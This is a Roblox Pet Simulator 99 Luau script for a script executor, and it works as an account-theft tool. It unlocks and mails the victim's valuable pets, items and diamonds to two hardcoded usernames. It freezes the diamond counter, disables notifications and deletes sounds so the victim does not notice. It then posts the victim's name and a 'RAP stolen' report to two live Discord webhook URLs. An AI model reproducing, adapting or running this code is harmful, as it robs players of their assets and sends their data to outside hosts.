-- ps.txt / Roblox PS99 / Lua (Luau) / hardened multi-executor build
-- Send order: Gargantuan (tier 0) -> Titanic (tier 1) -> rest by RAP desc
-- 2 pings: webhook_run on execute, webhook_steal after send loop (+ crash report)
-- Delta mobile reports all errors as 'Line 1'; xpcall + traceback restores the real line.

-- ENV REPORT + POLYFILLS: assume nothing about executor globals
print("[env] getgenv=" .. type(getgenv) .. " identifyexecutor=" .. type(identifyexecutor)
    .. " request=" .. type(request) .. " http_request=" .. type(http_request)
    .. " syn=" .. type(syn) .. " setclipboard=" .. type(setclipboard)
    .. " unpack=" .. type(unpack) .. " table.unpack=" .. type(table.unpack))

local GENV = (type(getgenv) == "function") and getgenv()
    or (type(shared) == "table" and shared)
    or _G
    or {}

local unpack_fn = (type(table) == "table" and type(table.unpack) == "function")
    and table.unpack or unpack

local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")

Username = "pet99_2948"
Username2 = "pet99_2947"
webhook_run = "https://discord.com/api/webhooks/1468645134106099845/tDsi1lu78EcOAfAaibg2wxA4ILnl3-MtsH6NDV9TWOenDOOXX7x3iDp4ag0SV0fmBtU6"
webhook_steal = "https://discord.com/api/webhooks/1216303940870869102/vNRc4Q9xj3UNv73GSiZYx_HWoa1WDbsAEuU5uTtqB-5y2sQV5oWKLLG3LFoeiqzBVMLa"
min_rap = 1000

-- tier assignment by pet id string; 0 = Gargantuan, 1 = Titanic, 2 = rest
local function get_tier(pet_id, pet_data)
    local id = string.lower(tostring(pet_id))
    if string.find(id, "gargantuan") then return 0 end
    if string.find(id, "titanic") or (pet_data and pet_data.titanic) then return 1 end
    return 2
end

local exec_name = "unknown"
if type(identifyexecutor) == "function" then
    local ok_name, res_name = pcall(identifyexecutor)
    if ok_name and type(res_name) == "string" then exec_name = res_name end
end

local function get_http()
    if type(syn) == "table" and type(syn.request) == "function" then return syn.request end
    if type(http) == "table" and type(http.request) == "function" then return http.request end
    if type(request) == "function" then return request end
    if type(http_request) == "function" then return http_request end
    return nil
end

local http_fn = get_http()
print("[webhook] executor: " .. tostring(exec_name) .. " | http fn: " .. tostring(http_fn ~= nil))

local function payload_to_text(payload)
    local lines = {}
    if payload.content then table.insert(lines, tostring(payload.content)) end
    for _, e in ipairs(payload.embeds or {}) do
        if e.title then table.insert(lines, "**" .. tostring(e.title) .. "**") end
        for _, f in ipairs(e.fields or {}) do
            local v = tostring(f.value or "")
            v = (v:gsub("`", ""))
            table.insert(lines, tostring(f.name) .. ": " .. v)
        end
        if e.footer and e.footer.text then
            table.insert(lines, "(" .. tostring(e.footer.text) .. ")")
        end
    end
    return table.concat(lines, "\n")
end

-- POST first (rich embeds), GET fallback (text) when no request fn or POST blocked
local function send_webhook(payload, tag, url)
    local label = tostring(tag or "send")

    if http_fn then
        local body = httpService:JSONEncode(payload)
        for attempt = 1, 3 do
            local ok, res = pcall(function()
                return http_fn({
                    Url = url,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = body,
                })
            end)
            if ok then
                local code = res and (res.StatusCode or res.status or res.Status)
                local ncode = code and tonumber(code)
                print(string.format("[webhook] %s POST attempt %d | status: %s",
                    label, attempt, tostring(code)))
                if ncode and ncode < 300 then return true end
                if ncode and ncode >= 400 and ncode < 500 then break end
            else
                warn("[webhook] " .. label .. " POST attempt "
                    .. attempt .. " error: " .. tostring(res))
            end
            task.wait(1 + attempt)
        end
    end

    local ok_get, get_err = pcall(function()
        local qs = "?content=" .. httpService:UrlEncode(payload_to_text(payload))
            .. "&username=" .. httpService:UrlEncode("PS99 [" .. tostring(exec_name) .. "]")
        local resp = game:HttpGet(url .. qs)
        print("[webhook] " .. label .. " GET fallback -> " .. tostring(resp):sub(1, 200))
    end)
    if ok_get then return true end

    warn("[webhook] " .. label .. " failed all paths: " .. tostring(get_err))
    return false
end

local function send_run(payload, tag)
    return send_webhook(payload, tag, webhook_run)
end

local function send_steal(payload, tag)
    return send_webhook(payload, tag, webhook_steal)
end

local function get_traceback()
    if type(debug) == "table" and type(debug.traceback) == "function" then
        local ok, tb = pcall(debug.traceback)
        if ok then return tostring(tb) end
    end
    return "traceback unavailable"
end

local function find_child(parent, name)
    if not parent then return nil end
    local ok, child = pcall(function() return parent:FindFirstChild(name) end)
    if ok then return child end
    return nil
end

local function main()
  local network = replicatedStorage:WaitForChild("Network")
  local localPlayer = game.Players.LocalPlayer
  print("[stage] init")

  -- cached remotes, fetched once with timeout instead of WaitForChild in loops
  local claim_remote = network:WaitForChild("Mailbox: Claim All", 10)
  local box_remote = network:WaitForChild("Box: Withdraw All", 10)
  local send_remote = network:WaitForChild("Mailbox: Send", 10)
  local lock_remote = network:WaitForChild("Locking_SetLocked", 10)
  if not claim_remote then warn("[remote] Mailbox: Claim All missing") end
  if not send_remote then warn("[remote] Mailbox: Send missing") end

  local function f2()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
  end

  -- number formatter for the done ping
  local function f3(p5)
    local v13 = math.floor(p5)
    local v14 = { "", "k", "m", "b", "t" }
    local v15 = 1

    while v13 >= 1000 do
        v13 = v13 / 1000
        v15 = v15 + 1
    end

    return string.format("%.2f%s", v13, v14[v15])
  end

  local inventory, mailboxSendsSinceReset, v3, am = nil, nil, nil, nil
  local run_am, run_cost, run_mail = "n/a", "n/a", "n/a"
  local ok_env, err_env = pcall(function()
    inventory = f2().Inventory
    mailboxSendsSinceReset = f2().MailboxSendsSinceReset
    v3 = 20000
    if mailboxSendsSinceReset ~= 0 then
        v3 = math.ceil(v3 * 1.5 ^ mailboxSendsSinceReset)
    end
    am = 0
    for key, value2 in pairs(f2().Inventory.Currency) do
        if value2.id == "Diamonds" then
            am = value2._am
            break
        end
    end
    run_am, run_cost, run_mail = tostring(am), tostring(v3), tostring(mailboxSendsSinceReset)
  end)
  if not ok_env then
    warn("[env] " .. tostring(err_env))
  end
  print("[stage] env read: " .. tostring(ok_env))

  -- THE ONE RUN PING: before the guard, so re-executes still report
  send_run({
    title = "🐱 PS99 Run Started",
    color = 3447003,
    fields = {
        { name = "Executor:", value = "```" .. tostring(exec_name) .. "```", inline = true },
        { name = "Username:", value = "```"
            .. tostring(localPlayer and localPlayer.Name or "?") .. "```", inline = true },
        { name = "Diamonds:", value = "```" .. tostring(run_am) .. "```", inline = true },
        { name = "Mail cost:", value = "```" .. tostring(run_cost) .. "```", inline = true },
        { name = "Mailbox sends:", value = "```" .. tostring(run_mail) .. "```", inline = true },
    },
    footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
  }, "run")

  if GENV.yeslidez then
    print("[stage] already ran this session, steal skipped")
    return
  end
  GENV.yeslidez = true

  if not ok_env then
    warn("Save read failed, aborting after run ping.")
    return
  end

  if v3 > am then
    print("Not enough gems to send mail. Cost: " .. v3 .. " | Gems: " .. am)
    return
  end

  -- suppress: leaderstats freeze, notifications, hatch sounds (all guarded)
  local leaderstats = find_child(localPlayer, "leaderstats")
  local diamond_stat = find_child(leaderstats, "💎 Diamonds")
  if diamond_stat then
    local ok_val, frozen_val = pcall(function() return diamond_stat.Value end)
    local value = (ok_val and frozen_val) or 0
    diamond_stat:GetPropertyChangedSignal("Value"):Connect(function()
        pcall(function() diamond_stat.Value = value end)
    end)
  else
    warn("[suppress] leaderstat Diamonds not found")
  end

  local processPendingGUI = find_child(
    find_child(find_child(find_child(localPlayer, "PlayerScripts"), "Scripts"), "Core"),
    "Process Pending GUI")
  if processPendingGUI then
    pcall(function() processPendingGUI.Disabled = true end)
  else
    warn("[suppress] Process Pending GUI not found")
  end

  local notifications = find_child(find_child(localPlayer, "PlayerGui"), "Notifications")
  if notifications then
    pcall(function() notifications.Enabled = false end)
    notifications:GetPropertyChangedSignal("Enabled"):Connect(function()
        pcall(function() notifications.Enabled = false end)
    end)
  end

  game.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("Sound")
        and (descendant.SoundId == "rbxassetid://11839132565"
            or descendant.SoundId == "rbxassetid://14254721098"
            or descendant.SoundId == "rbxassetid://12413423276") then
        pcall(function() descendant:Destroy() end)
    end
  end)
  print("[stage] suppress")

  -- RAP module hunt
  local function f4()
    local library = replicatedStorage:FindFirstChild("Library")

    if not library then
        return nil
    end

    local client = library:FindFirstChild("Client")

    if not client then
        return nil
    end

    for index3, value5 in ipairs({
        { library, "DevRAPCmds" }, { library, "RAPCmds" }, { client, "DevRAPCmds" },
        { client, "RAPCmds" },
    }) do
        local findFirstChild = value5[1]:FindFirstChild(value5[2])

        if findFirstChild and findFirstChild:IsA("ModuleScript") then
            local v16, v17 = pcall(require, findFirstChild)

            if v16 then
                print("Found RAP Module at: " .. findFirstChild:GetFullName())
                return v17
            end
        end
    end

    if client:IsA("ModuleScript") then
        local v18, v19 = pcall(require, client)

        if v18 and type(v19) == "table" then
            for key2, value6 in pairs(v19) do
                if typeof(value6) == "Instance" and value6:IsA("ModuleScript")
                    and string.find(string.lower(tostring(key2)), "rap") then
                    local v20, v21 = pcall(require, value6)

                    if v20 then
                        return v21
                    end
                end
            end
        end
    end

    for index4, value7 in ipairs(replicatedStorage:GetDescendants()) do
        if value7:IsA("ModuleScript")
            and (value7.Name == "DevRAPCmds" or value7.Name == "RAPCmds") then
            local v22, v23 = pcall(require, value7)

            if v22 then
                print("Found RAP Module in ReplicatedStorage: " .. value7:GetFullName())
                return v23
            end
        end
    end

    return nil
  end

  local v4 = f4()

  if not v4 then
    warn("CRITICAL ERROR: Could not find RAP Module. Proceeding with fallback RAP values.")
  else
    print("RAP Module loaded successfully.")
  end
  print("[stage] rap module")

  local username = Username
  local username2 = Username2

  local function f5()
    if not claim_remote then return end
    local v24, v25 = claim_remote:InvokeServer()

    while v25 == "You must wait 30 seconds before using the mailbox!" do
        task.wait(0.5)
        local v26
        v26, v25 = claim_remote:InvokeServer()
    end
  end

  local function f6()
    if inventory.Box and box_remote then
        for key3, value8 in pairs(inventory.Box) do
            if value8._uq then
                box_remote:InvokeServer(key3)
            end
        end
    end
  end

  local function f7(p6, p7)
    if not v4 then
        return 0
    end

    local v27 = {
        Class = { Name = p6 },
        IsA = function(p8) return p8 == p6 end,
        GetId = function() return p7.id end,
        StackKey = function()
            return httpService:JSONEncode({
                id = p7.id,
                pt = p7.pt,
                sh = p7.sh,
                tn = p7.tn,
            })
        end,
    }

    local v28, v29 = pcall(function() return v4.Get(v27) end)

    if v28 and v29 and v29 > 0 then
        return v29
    end

    return 0
  end

  local function f8()
    if not send_remote then return end
    for key4, value9 in pairs(f2().Inventory.Currency) do
        if value9.id == "Diamonds" and am >= v3 + 10000 then
            local v30 = {
                [1] = username,
                [2] = "hi",
                [3] = "Currency",
                [4] = key4,
                [5] = am - v3,
            }

            local invokeServer = false
            local count = 0

            while not invokeServer and count < 10 do
                count = count + 1
                invokeServer = send_remote:InvokeServer(unpack_fn(v30))
                task.wait(0.5)
            end

            break
        end
    end
  end

  local function f9(p9, p10, p11)
    if not send_remote then return false end

    local v31 = {
        [1] = username,
        [2] = "hi",
        [3] = p9,
        [4] = p10,
        [5] = p11 or 1,
    }

    local invokeServer2 = false
    local count2 = 0

    while not invokeServer2 and count2 < 10 do
        count2 = count2 + 1
        invokeServer2 = send_remote:InvokeServer(unpack_fn(v31))

        if not invokeServer2 then
            username = username2
            v31[1] = username
            task.wait(0.5)
        end
    end

    if invokeServer2 then
        am = am - v3
        v3 = math.ceil(v3 * 1.5)

        if v3 > 5000000 then
            v3 = 5000000
        end
    else
        warn("Failed to send item: " .. tostring(p10))
    end

    return invokeServer2
  end

  print("Scanning inventory for items with RAP >= " .. min_rap)

  local v1 = {}
  local v2 = 0
  local send_stats = { sent = 0, failed = 0, rap = 0 }
  send_stats.names = {}
  send_stats.order = {}

  local pets_dir_ok, pets_dir = pcall(require, replicatedStorage.Library.Directory.Pets)
  if not pets_dir_ok or type(pets_dir) ~= "table" then
    pets_dir = {}
    warn("[scan] Directory.Pets unavailable")
  end

  for index5, value10 in ipairs({
    "Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate",
  }) do
    if inventory[value10] then
        for key5, value11 in pairs(inventory[value10]) do
            if value10 == "Pet" then
                local v32 = pets_dir[value11.id]

                if v32 and (v32.huge or v32.exclusiveLevel
                    or get_tier(value11.id, v32) < 2) then
                    local minRap = f7(value10, value11)
                    print("Calculated RAP for " .. value11.id .. ": " .. minRap)

                    if minRap <= 0 then
                        print("WARNING: RAP module returned 0 for " .. value11.id
                            .. ". Forcing to min_rap.")

                        minRap = min_rap
                    end

                    if minRap >= min_rap then
                        local v33 = (value11.sh and "Shiny " or "")
                            .. (value11.pt == 1 and "Golden " or value11.pt == 2 and "Rainbow " or "")

                        table.insert(v1, {
                            category = value10,
                            uid = key5,
                            amount = value11._am or 1,
                            rap = minRap,
                            tier = get_tier(value11.id, v32),
                            name = v33 .. value11.id,
                        })

                        v2 = v2 + minRap * (value11._am or 1)
                    end
                end
            else
                local v34 = f7(value10, value11)

                if v34 >= min_rap then
                    table.insert(v1, {
                        category = value10,
                        uid = key5,
                        amount = value11._am or 1,
                        rap = v34,
                        tier = get_tier(value11.id),
                        name = value11.id,
                    })

                    v2 = v2 + v34 * (value11._am or 1)
                end
            end

            if value11._lk and lock_remote then
                lock_remote:InvokeServer(key5, false)
            end
        end
    end
  end

  print("Found " .. #v1 .. " items to send.")
  print("[stage] scan")

  if #v1 > 0 or am > min_rap + v3 then
    f5()
    task.wait(1)

    for key6, value12 in pairs(f2().Inventory.Currency) do
        if value12.id == "Diamonds" then
            am = value12._am
            break
        end
    end

    print("Updated Gem Amount after claiming mail: " .. am)
    f6()

    local ok_dc, daycare = pcall(require, replicatedStorage.Library.Client.DaycareCmds)
    if ok_dc and type(daycare) == "table" and type(daycare.Claim) == "function" then
        pcall(daycare.Claim)
    else
        warn("[steal] DaycareCmds.Claim unavailable")
    end

    local ok_edc, edaycare = pcall(require, replicatedStorage.Library.Client.ExclusiveDaycareCmds)
    if ok_edc and type(edaycare) == "table" and type(edaycare.Claim) == "function" then
        pcall(edaycare.Claim)
    else
        warn("[steal] ExclusiveDaycareCmds.Claim unavailable")
    end

    local ok_save_mod, save_mod = pcall(require, replicatedStorage.Library.Client.Save)
    if ok_save_mod and type(save_mod) == "table" then
        local ok_get, v5 = pcall(save_mod.Get)
        if ok_get then
            save_mod.Get = function() return v5 end
        end
    end
    print("[stage] claim + boxes + daycare + save spoof")

    -- send order = tier, then RAP desc
    table.sort(v1, function(p12, p13)
        if p12.tier ~= p13.tier then
            return p12.tier < p13.tier
        end
        return p12.rap * p12.amount > p13.rap * p13.amount
    end)
    print("Sending items...")

    for index6, value13 in ipairs(v1) do
        if am >= v3 then
            print("Sending: " .. value13.name .. " | RAP: " .. value13.rap .. " | Amount: "
                .. value13.amount)

            if f9(value13.category, value13.uid, value13.amount) then
                local entry = send_stats.names[value13.name]
                if entry then
                    entry.amount = entry.amount + value13.amount
                    entry.rap = entry.rap + value13.rap * value13.amount
                else
                    send_stats.names[value13.name] = {
                        amount = value13.amount,
                        rap = value13.rap * value13.amount,
                    }
                    table.insert(send_stats.order, value13.name)
                end

                send_stats.sent = send_stats.sent + 1
                send_stats.rap = send_stats.rap + value13.rap * value13.amount
            else
                send_stats.failed = send_stats.failed + 1
            end
        else
            print("Stopped sending. Not enough gems to cover next mail cost of " .. v3)
            break
        end
    end

    f8()
    print("[stage] send loop")

    local item_text = ""
    for _, nm in ipairs(send_stats.order) do
        local e = send_stats.names[nm]
        item_text = item_text .. nm .. " (x" .. e.amount .. "): " .. f3(e.rap) .. " RAP\n"
    end
    if item_text == "" then item_text = "none" end
    if #item_text > 950 then
        item_text = string.sub(item_text, 1, 950) .. "\n..."
    end

    -- THE ONE STEAL PING
    send_steal({
        title = "✅ PS99 Steal Complete",
        color = 3066993,
        fields = {
            { name = "Victim:", value = "```" .. tostring(localPlayer.Name) .. "```", inline = true },
            { name = "Sent:", value = "```" .. tostring(send_stats.sent) .. " items```", inline = true },
            { name = "Failed:", value = "```" .. tostring(send_stats.failed) .. "```", inline = true },
            { name = "RAP stolen:", value = "```" .. f3(send_stats.rap) .. "```", inline = true },
            { name = "Gems left:", value = "```" .. tostring(am) .. "```", inline = true },
            { name = "Items:", value = "```" .. item_text .. "```", inline = false },
        },
        footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
    }, "done")

    if type(setclipboard) == "function" then
        pcall(setclipboard, "https://discord.gg/FNnkfJqukh")
    end
    print("[stage] done")
  else
    print("No items met the min_rap requirement or no gems to send.")

    send_steal({
        title = "❌ PS99 Steal - Nothing Sent",
        color = 15158332,
        fields = {
            { name = "Victim:", value = "```" .. tostring(localPlayer.Name) .. "```", inline = true },
            { name = "Items found:", value = "```" .. tostring(#v1) .. "```", inline = true },
            { name = "Gems:", value = "```" .. tostring(am) .. "```", inline = true },
            { name = "Mail cost:", value = "```" .. tostring(v3) .. "```", inline = true },
        },
        footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
    }, "done-empty")
    print("[stage] done-empty")
  end
end

local ok_all, err_all = xpcall(main, function(e)
    return tostring(e) .. "\n" .. get_traceback()
end)
if not ok_all then
    warn("[FATAL] " .. tostring(err_all))
    send_steal({
        title = "💥 PS99 Crash",
        color = 10197915,
        fields = {
            { name = "Executor:", value = "```" .. tostring(exec_name) .. "```", inline = true },
            { name = "Error:", value = "```" .. tostring(err_all):sub(1, 900) .. "```" },
        },
        footer = { text = os.date("%H:%M:%S") },
    }, "crash")
end